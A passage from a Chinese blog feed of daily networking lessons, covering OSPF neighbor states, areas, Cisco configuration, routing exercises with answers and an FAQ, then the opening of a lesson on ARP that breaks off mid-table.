class="hljs-bullet">- </span>分层设计（区域）<br><span class="hljs-bullet">- </span>支持认证<br><span class="hljs-bullet">- </span>协议：IP协议89<br><span class="hljs-bullet">- </span>管理距离：110<br><br>版本：<br><span class="hljs-bullet">- </span>OSPFv2：IPv4<br><span class="hljs-bullet">- </span>OSPFv3：IPv6<br><br>优点：<br>✅ 快速收敛<br>✅ 无环路<br>✅ 支持大型网络<br>✅ 精确度量（带宽）<br>✅ 分层设计<br>✅ 负载均衡<br><br>缺点：<br>❌ 配置复杂<br>❌ 占用CPU和内存<br>❌ 需要规划区域<br></code></pre></td></tr></table></figure><h3 id="6-2-OSPF工作原理"><a href="#6-2-OSPF工作原理" class="headerlink" title="6.2 OSPF工作原理"></a>6.2 OSPF工作原理</h3><p><strong>邻居关系</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs markdown">OSPF邻居建立过程：<br><br><span class="hljs-bullet">1.</span> Down状态<br><span class="hljs-bullet">   -</span> 初始状态<br><span class="hljs-bullet">   -</span> 未发送Hello<br><br><span class="hljs-bullet">2.</span> Init状态<br><span class="hljs-bullet">   -</span> 发送Hello包<br><span class="hljs-bullet">   -</span> 尚未收到邻居的Hello<br><br><span class="hljs-bullet">3.</span> 2-Way状态<br><span class="hljs-bullet">   -</span> 收到对方Hello<br><span class="hljs-bullet">   -</span> 看到自己的Router ID<br><span class="hljs-bullet">   -</span> 邻居关系建立<br><span class="hljs-bullet">   -</span> 选举DR/BDR（如果在多路访问网络）<br><br><span class="hljs-bullet">4.</span> ExStart状态<br><span class="hljs-bullet">   -</span> 决定主从关系<br><span class="hljs-bullet">   -</span> Router ID大的为主<br><br><span class="hljs-bullet">5.</span> Exchange状态<br><span class="hljs-bullet">   -</span> 交换数据库描述（DBD）<br><span class="hljs-bullet">   -</span> 描述链路状态数据库<br><br><span class="hljs-bullet">6.</span> Loading状态<br><span class="hljs-bullet">   -</span> 请求完整LSA<br><span class="hljs-bullet">   -</span> 发送LSR（链路状态请求）<br><span class="hljs-bullet">   -</span> 接收LSU（链路状态更新）<br><br><span class="hljs-bullet">7.</span> Full状态<br><span class="hljs-bullet">   -</span> 数据库同步完成<br><span class="hljs-bullet">   -</span> 邻接关系建立<br><span class="hljs-bullet">   -</span> 可以转发流量<br><br>Hello包内容：<br><span class="hljs-bullet">-</span> Router ID<br><span class="hljs-bullet">-</span> Area ID<br><span class="hljs-bullet">-</span> 认证信息<br><span class="hljs-bullet">-</span> Hello间隔<br><span class="hljs-bullet">-</span> Dead间隔<br><span class="hljs-bullet">-</span> 优先级<br><span class="hljs-bullet">-</span> DR和BDR<br><span class="hljs-bullet">-</span> 邻居列表<br><br>Hello间隔：<br><span class="hljs-bullet">-</span> 默认10秒（点对点、广播）<br><span class="hljs-bullet">-</span> 30秒（NBMA）<br><br>Dead间隔：<br><span class="hljs-bullet">-</span> 默认40秒（4倍Hello）<br></code></pre></td></tr></table></figure><p><strong>区域概念</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs markdown">OSPF区域设计：<br><br>为什么需要区域？<br><span class="hljs-bullet">-</span> 减少LSA泛洪<br><span class="hljs-bullet">-</span> 减小路由表<br><span class="hljs-bullet">-</span> 加快收敛<br><span class="hljs-bullet">-</span> 隔离故障<br><br>区域类型：<br><br><span class="hljs-bullet">1.</span> 骨干区域（Area 0）<br><span class="hljs-bullet">   -</span> 所有区域必须连接到Area 0<br><span class="hljs-bullet">   -</span> 核心区域<br><span class="hljs-bullet">   -</span> 不能分割<br><br><span class="hljs-bullet">2.</span> 常规区域（Regular Area）<br><span class="hljs-bullet">   -</span> 标准OSPF区域<br><span class="hljs-bullet">   -</span> 接收所有LSA类型<br><br><span class="hljs-bullet">3.</span> 末端区域（Stub Area）<br><span class="hljs-bullet">   -</span> 不接收外部LSA（Type 5）<br><span class="hljs-bullet">   -</span> 使用默认路由<br><span class="hljs-bullet">   -</span> 减少路由表<br><br><span class="hljs-bullet">4.</span> 完全末端区域（Totally Stub Area）<br><span class="hljs-bullet">   -</span> 只有默认路由和区域内路由<br><span class="hljs-bullet">   -</span> Cisco专有<br><br><span class="hljs-bullet">5.</span> NSSA（Not-So-Stubby Area）<br><span class="hljs-bullet">   -</span> 类似Stub，但允许注入外部路由（Type 7）<br><br>拓扑示例：<br><span class="hljs-code">         ┌──────────────┐</span><br><span class="hljs-code">         │   Area 0     │</span><br><span class="hljs-code">         │   (骨干)     │</span><br><span class="hljs-code">         └───┬──────┬───┘</span><br><span class="hljs-code">             │      │</span><br><span class="hljs-code">      ┌──────┴──┐ ┌─┴──────┐</span><br><span class="hljs-code">      │ Area 1  │ │ Area 2 │</span><br><span class="hljs-code">      └─────────┘ └────────┘</span><br><span class="hljs-code"></span><br>路由器类型：<br><span class="hljs-bullet">-</span> 内部路由器（IR）：所有接口在同一区域<br><span class="hljs-bullet">-</span> 骨干路由器（BR）：至少一个接口在Area 0<br><span class="hljs-bullet">-</span> 区域边界路由器（ABR）：连接多个区域<br><span class="hljs-bullet">-</span> 自治系统边界路由器（ASBR）：连接其他AS<br></code></pre></td></tr></table></figure><h3 id="6-3-OSPF配置示例"><a href="#6-3-OSPF配置示例" class="headerlink" title="6.3 OSPF配置示例"></a>6.3 OSPF配置示例</h3><p><strong>Cisco路由器</strong>：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 启用OSPF（进程号100）</span><br>Router(<span class="hljs-built_in">config</span>)<span class="hljs-comment"># router ospf 100</span><br><br><span class="hljs-comment"># 设置Router ID</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># router-id 1.1.1.1</span><br><br><span class="hljs-comment"># 通告网络（精确匹配）</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># network 192.168.1.0 0.0.0.255 area 0</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># network 192.168.2.0 0.0.0.255 area 1</span><br><br><span class="hljs-comment"># 配置被动接口</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># passive-interface GigabitEthernet0/0</span><br><br><span class="hljs-comment"># 修改Cost</span><br>Router(<span class="hljs-built_in">config</span>)<span class="hljs-comment"># interface GigabitEthernet0/1</span><br>Router(<span class="hljs-built_in">config</span>-if)<span class="hljs-comment"># ip ospf cost 10</span><br><br><span class="hljs-comment"># 修改Hello间隔</span><br>Router(<span class="hljs-built_in">config</span>-if)<span class="hljs-comment"># ip ospf hello-interval 5</span><br>Router(<span class="hljs-built_in">config</span>-if)<span class="hljs-comment"># ip ospf dead-interval 20</span><br><br><span class="hljs-comment"># 查看OSPF邻居</span><br>Router<span class="hljs-comment"># show ip ospf neighbor</span><br><br><span class="hljs-comment"># 查看OSPF数据库</span><br>Router<span class="hljs-comment"># show ip ospf database</span><br><br><span class="hljs-comment"># 查看OSPF接口</span><br>Router<span class="hljs-comment"># show ip ospf interface</span><br><br><span class="hljs-comment"># 查看OSPF路由</span><br>Router<span class="hljs-comment"># show ip route ospf</span><br></code></pre></td></tr></table></figure><hr><h2 id="7-实战项目：路由表模拟器"><a href="#7-实战项目：路由表模拟器" class="headerlink" title="7. 实战项目：路由表模拟器"></a>7. 实战项目：路由表模拟器</h2><h3 id="7-1-项目需求"><a href="#7-1-项目需求" class="headerlink" title="7.1 项目需求"></a>7.1 项目需求</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">功能需求：<br><span class="hljs-bullet">1.</span> 路由表管理<br><span class="hljs-bullet">   -</span> 添加/删除路由<br><span class="hljs-bullet">   -</span> 查看路由表<br><span class="hljs-bullet">   -</span> 导入/导出<br><br><span class="hljs-bullet">2.</span> 路由查找<br><span class="hljs-bullet">   -</span> 最长前缀匹配<br><span class="hljs-bullet">   -</span> 查找路径<br><span class="hljs-bullet">   -</span> 性能测试<br><br><span class="hljs-bullet">3.</span> 路由协议模拟<br><span class="hljs-bullet">   -</span> 静态路由<br><span class="hljs-bullet">   -</span> 简单RIP模拟<br><span class="hljs-bullet">   -</span> 路由收敛演示<br><br><span class="hljs-bullet">4.</span> 可视化<br><span class="hljs-bullet">   -</span> 路由表显示<br><span class="hljs-bullet">   -</span> 查找过程展示<br><span class="hljs-bullet">   -</span> 网络拓扑图<br><br>技术要求：<br><span class="hljs-bullet">-</span> Python实现<br><span class="hljs-bullet">-</span> 支持IPv4/IPv6<br><span class="hljs-bullet">-</span> 命令行界面<br><span class="hljs-bullet">-</span> 友好的输出<br></code></pre></td></tr></table></figure><h3 id="7-2-工具演示"><a href="#7-2-工具演示" class="headerlink" title="7.2 工具演示"></a>7.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 路由表管理</span><br>python day26_routing_sim.py --add 192.168.2.0/24 --via 192.168.1.254<br>python day26_routing_sim.py --show<br><br><span class="hljs-comment"># 路由查找</span><br>python day26_routing_sim.py --lookup 192.168.2.100<br><br><span class="hljs-comment"># RIP模拟</span><br>python day26_routing_sim.py --simulate-rip<br></code></pre></td></tr></table></figure><hr><h2 id="8-今日练习"><a href="#8-今日练习" class="headerlink" title="8. 今日练习"></a>8. 今日练习</h2><h3 id="练习1：查看本机路由表"><a href="#练习1：查看本机路由表" class="headerlink" title="练习1：查看本机路由表"></a>练习1：查看本机路由表</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> Linux/macOS:<br>   ip route show<br>   或<br>   netstat -rn<br><br>   分析：<br><span class="hljs-bullet">   -</span> 有多少条路由？<br><span class="hljs-bullet">   -</span> 默认网关是什么？<br><span class="hljs-bullet">   -</span> 有直连路由吗？<br><br><span class="hljs-bullet">2.</span> Windows:<br>   route print<br><br>   分析：<br><span class="hljs-bullet">   -</span> 默认路由的度量是多少？<br><span class="hljs-bullet">   -</span> 有多个网卡吗？<br></code></pre></td></tr></table></figure><h3 id="练习2：静态路由实验"><a href="#练习2：静态路由实验" class="headerlink" title="练习2：静态路由实验"></a>练习2：静态路由实验</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">虚拟机实验：<br><br>拓扑：<br>VM1 (<span class="hljs-number">192.168.1.10</span>) ← → VM2 (<span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">192.168.2.1</span>) ← → VM3 (<span class="hljs-number">192.168.2.10</span>)<br><br>步骤：<br><span class="hljs-number">1</span>. 配置VM2为路由器（启用IP转发）<br>   sudo sysctl -w net.ipv4.ip_forward=<span class="hljs-number">1</span><br><br><span class="hljs-number">2</span>. VM1添加到<span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span>的路由<br>   sudo ip route add <span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">192.168.1.1</span><br><br><span class="hljs-number">3</span>. VM3添加到<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>的路由<br>   sudo ip route add <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">192.168.2.1</span><br><br><span class="hljs-number">4</span>. 测试连通性<br>   从VM1 ping VM3<br><br><span class="hljs-number">5</span>. 查看数据包路径<br>   traceroute从VM1到VM3<br></code></pre></td></tr></table></figure><h3 id="练习3：路由查找练习"><a href="#练习3：路由查找练习" class="headerlink" title="练习3：路由查找练习"></a>练习3：路由查找练习</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">给定路由表：<br><span class="hljs-number">1</span>. <span class="hljs-number">0.0.0.0</span>/<span class="hljs-number">0</span> via <span class="hljs-number">192.168.1.1</span><br><span class="hljs-number">2</span>. <span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span> via <span class="hljs-number">192.168.1.2</span><br><span class="hljs-number">3</span>. <span class="hljs-number">10.1.0.0</span>/<span class="hljs-number">16</span> via <span class="hljs-number">192.168.1.3</span><br><span class="hljs-number">4</span>. <span class="hljs-number">10.1.2.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">192.168.1.4</span><br><span class="hljs-number">5</span>. <span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span> via <span class="hljs-number">192.168.1.5</span><br><br>查找以下目标IP的路由：<br><span class="hljs-number">1</span>. <span class="hljs-number">10.1.2.100</span> → ?<br><span class="hljs-number">2</span>. <span class="hljs-number">10.1.3.100</span> → ?<br><span class="hljs-number">3</span>. <span class="hljs-number">10.2.1.100</span> → ?<br><span class="hljs-number">4</span>. <span class="hljs-number">192.168.100.1</span> → ?<br><span class="hljs-number">5</span>. <span class="hljs-number">8.8.8.8</span> → ?<br><br>（答案见文末）<br></code></pre></td></tr></table></figure><hr><h2 id="9-常见问题"><a href="#9-常见问题" class="headerlink" title="9. 常见问题"></a>9. 常见问题</h2><p><strong>Q1：静态路由和动态路由能同时使用吗？</strong></p><p>A：<br>可以！实际网络常常混合使用</p><ul><li>默认路由：静态</li><li>内部网络：动态（OSPF）</li><li>特定路由：静态</li></ul><p>管理距离决定优先级：</p><ul><li>直连：0</li><li>静态：1</li><li>OSPF：110</li><li>RIP：120</li></ul><p><strong>Q2：路由环路怎么检测？</strong></p><p>A：</p><ul><li>TTL：每经过路由器减1，为0丢弃</li><li>Traceroute：显示路径，可见环路</li><li>路由协议防环机制</li></ul><p><strong>Q3：为什么需要默认路由？</strong></p><p>A：</p><ul><li>不可能配置所有路由</li><li>互联网上几十万条路由</li><li>默认路由：匹配所有</li><li>通常指向ISP</li></ul><p><strong>Q4：RIP和OSPF如何选择？</strong></p><p>A：<br>小型网络（&lt;15跳）：RIP</p><ul><li>配置简单</li><li>资源占用低</li></ul><p>大型网络：OSPF</p><ul><li>快速收敛</li><li>无跳数限制</li><li>更精确</li></ul><p><strong>Q5：什么是管理距离？</strong></p><p>A：<br>管理距离（AD）&#x3D; 路由信息的可信度</p><ul><li>值越小越可信</li><li>用于选择路由来源</li></ul><p>常见AD：</p><ul><li>直连：0</li><li>静态：1</li><li>EIGRP：90</li><li>OSPF：110</li><li>RIP：120</li><li>外部：255（不可信）</li></ul><hr><h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>路由基础</strong>：</p><ul><li>路由的作用和原理</li><li>直连路由vs间接路由</li><li>下一跳概念</li></ul></li><li><p><strong>路由表</strong>：</p><ul><li>路由表结构</li><li>最长前缀匹配</li><li>路由查找过程</li></ul></li><li><p><strong>静态路由</strong>：</p><ul><li>配置方法</li><li>优缺点</li><li>使用场景</li></ul></li><li><p><strong>动态路由分类</strong>：</p><ul><li>IGP vs EGP</li><li>距离矢量 vs 链路状态</li><li>路由度量</li></ul></li><li><p><strong>RIP协议</strong>：</p><ul><li>距离矢量协议</li><li>跳数度量</li><li>防环机制</li><li>配置方法</li></ul></li><li><p><strong>OSPF基础</strong>：</p><ul><li>链路状态协议</li><li>区域设计</li><li>邻居关系</li><li>快速收敛</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">路由查找：<br>最长前缀匹配 → 主机路由优先 → 网络路由 → 默认路由<br><br>动态路由分类：<br>距离矢量（RIP）：简单，慢，适合小网络<br>链路状态（OSPF）：复杂，快，适合大网络<br><br>RIP防环：<br><span class="hljs-bullet">- </span>最大跳数（15）<br><span class="hljs-bullet">- </span>水平分割<br><span class="hljs-bullet">- </span>毒性逆转<br><span class="hljs-bullet">- </span>抑制定时器<br><span class="hljs-bullet">- </span>触发更新<br><br>OSPF特点：<br><span class="hljs-bullet">- </span>快速收敛<br><span class="hljs-bullet">- </span>区域设计<br><span class="hljs-bullet">- </span>Cost度量<br><span class="hljs-bullet">- </span>LSA泛洪<br></code></pre></td></tr></table></figure><h3 id="练习3答案"><a href="#练习3答案" class="headerlink" title="练习3答案"></a>练习3答案</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. <span class="hljs-number">10.1.2.100</span> → via <span class="hljs-number">192.168.1.4</span>（/<span class="hljs-number">24</span>最长）<br><span class="hljs-attribute">2</span>. <span class="hljs-number">10.1.3.100</span> → via <span class="hljs-number">192.168.1.3</span>（/<span class="hljs-number">16</span>）<br><span class="hljs-attribute">3</span>. <span class="hljs-number">10.2.1.100</span> → via <span class="hljs-number">192.168.1.2</span>（/<span class="hljs-number">8</span>）<br><span class="hljs-attribute">4</span>. <span class="hljs-number">192.168.100.1</span> → via <span class="hljs-number">192.168.1.5</span>（/<span class="hljs-number">16</span>）<br><span class="hljs-attribute">5</span>. <span class="hljs-number">8.8.8.8</span> → via <span class="hljs-number">192.168.1.1</span>（默认路由）<br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第27天：第四周综合实战</strong></p><p>内容预览：</p><ul><li>网络层知识回顾</li><li>综合实战项目</li><li>网络排错案例</li><li>性能优化</li><li>周总结</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们深入学习了路由协议，理解了网络层最核心的概念之一。从静态路由到动态路由，从RIP到OSPF，这些都是网络工程师必备的知识。明天我们将进行第四周的综合实战，巩固本周所学！</p><p><strong>进度：26&#x2F;180天（14.4%）</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>25天：ARP协议和链路层</title>
    <link href="/2025/11/10/25%E5%A4%A9%EF%BC%9AARP%E5%8D%8F%E8%AE%AE%E5%92%8C%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
    <url>/2025/11/10/25%E5%A4%A9%EF%BC%9AARP%E5%8D%8F%E8%AE%AE%E5%92%8C%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="第25天：ARP协议和链路层"><a href="#第25天：ARP协议和链路层" class="headerlink" title="第25天：ARP协议和链路层"></a>第25天：ARP协议和链路层</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>理解ARP协议的作用和工作原理</li><li>掌握ARP缓存管理</li><li>学习免费ARP和代理ARP</li><li>了解ARP安全问题和防御措施</li><li>理解MAC地址和以太网帧格式</li><li>学习VLAN基础</li><li>实现ARP工具</li></ul><hr><h2 id="1-ARP协议概述"><a href="#1-ARP协议概述" class="headerlink" title="1. ARP协议概述"></a>1. ARP协议概述</h2><h3 id="1-1-什么是ARP？"><a href="#1-1-什么是ARP？" class="headerlink" title="1.1 什么是ARP？"></a>1.1 什么是ARP？</h3><p><strong>ARP &#x3D; Address Resolution Protocol（地址解析协议）</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stata">ARP的作用：<br>将IP地址映射到<span class="hljs-keyword">MAC</span>地址<br><br>为什么需要ARP？<br>- 网络层使用IP地址通信<br>- 数据链路层使用<span class="hljs-keyword">MAC</span>地址通信<br>- 需要将IP地址转换为<span class="hljs-keyword">MAC</span>地址<br><br>生活比喻：<br>IP地址像家庭住址：<span class="hljs-string">&quot;北京市朝阳区某某街123号&quot;</span><br><span class="hljs-keyword">MAC</span>地址像门牌号码：<span class="hljs-string">&quot;1号楼2单元301室&quot;</span><br><br>快递员（数据包）需要：<br>1. 先找到街道（IP路由）<br>2. 再找到具体门牌（<span class="hljs-keyword">MAC</span>地址）<br><br>ARP就是<span class="hljs-string">&quot;查询门牌号的过程&quot;</span><br><br>工作场景：<br>主机A（192.168.1.10）想发送数据给主机B（192.168.1.20）<br>→ A知道B的IP地址（192.168.1.20）<br>→ A不知道B的<span class="hljs-keyword">MAC</span>地址<br>→ A使用ARP查询：<span class="hljs-string">&quot;谁是192.168.1.20？&quot;</span><br>→ B回复：<span class="hljs-string">&quot;我是，我的MAC地址是aa:bb:cc:dd:ee:ff&quot;</span><br>→ A记录下来，然后发送数据<br></code></pre></td></tr></table></figure><p><strong>ARP的特点</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">✅ 工作在数据链路层和网络层之间<br>✅ 只在局域网内工作（不跨路由器）<br>✅ 使用广播查询<br>✅ 使用单播应答<br>✅ 维护ARP缓存表<br><br>协议类型：<br><span class="hljs-bullet">- </span>以太网类型字段：0x0806（ARP）<br><span class="hljs-bullet">- </span>位于OSI模型第2层和第3层之间<br></code></pre></td></tr></table></figure><h3 id="1-2-为什么需要地址映射？"><a href="#1-2-为什么需要地址映射？" class="headerlink" title="1.2 为什么需要地址映射？"></a>1.2 为什么需要地址映射？</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown">网络通信的两种地址：<br><br><span class="hljs-bullet">1.</span> IP地址（逻辑地址）<br><span class="hljs-bullet">   -</span> 32位（IPv4）<br><span class="hljs-bullet">   -</span> 层次化<br><span class="hljs-bullet">   -</span> 可路由<br><span class="hljs-bullet">   -</span> 示例：192.168.1.10<br><br><span class="hljs-bullet">2.</span> MAC地址（物理地址）<br><span class="hljs-bullet">   -</span> 48位<br><span class="hljs-bullet">   -</span> 扁平化<br><span class="hljs-bullet">   -</span> 不可路由<br><span class="hljs-bullet">   -</span> 示例：aa:bb:cc:dd:ee:ff<br><br>为什么两种地址？<br><br>IP地址：<br>✅ 全局唯一（理论上）<br>✅ 层次化，支持路由<br>✅ 可以动态分配<br>✅ 便于网络管理<br><br>MAC地址：<br>✅ 硬件内置<br>✅ 网卡级别唯一<br>✅ 不需要配置<br>✅ 数据链路层使用<br><br>数据传输流程：<br>应用层：使用域名（www.google.com）<br>   ↓ DNS<br>网络层：使用IP地址（142.250.185.14）<br>   ↓ ARP<br>数据链路层：使用MAC地址（aa:bb:cc:dd:ee:ff）<br>   ↓<br>物理层：电信号传输<br><br>ARP是关键的桥梁！<br></code></pre></td></tr></table></figure><hr><h2 id="2-ARP工作原理"><a href="#2-ARP工作原理" class="headerlink" title="2. ARP工作原理"></a>2. ARP工作原理</h2><h3 id="2-1-ARP报文格式"><a href="#2-1-ARP报文格式" class="headerlink" title="2.1 ARP报文格式"></a>2.1 ARP报文格式</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 